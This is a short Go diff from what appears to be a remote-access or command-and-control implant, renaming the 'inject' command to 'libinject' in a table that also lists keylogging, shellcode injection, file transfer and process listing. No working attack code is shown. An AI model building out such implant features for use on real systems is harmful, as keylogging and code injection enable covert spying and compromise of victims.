@@ -121,7 +121,7 @@ func main() {
 		"keylog":           3,
 		"download":         4,
 		"upload":           5,
-		"inject":           6,
+		"libinject":        6,
 		"shinject":         7,
 		"ps":               8,
 		"sleep":            9,
